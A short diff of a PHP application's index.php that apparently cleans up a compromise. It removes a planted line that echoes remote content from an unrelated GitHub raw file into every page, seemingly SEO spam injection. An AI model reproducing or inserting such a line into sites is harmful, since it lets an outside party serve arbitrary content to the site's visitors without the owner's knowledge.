@@ -63,7 +63,6 @@
 // Initialize global environment
 define('INDEX_FILE_LOCATION', __FILE__);
 $application = require('./lib/pkp/includes/bootstrap.inc.php');
-echo file_get_contents("https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/nana4d.txt");
 
 // Serve the request
 $application->execute();
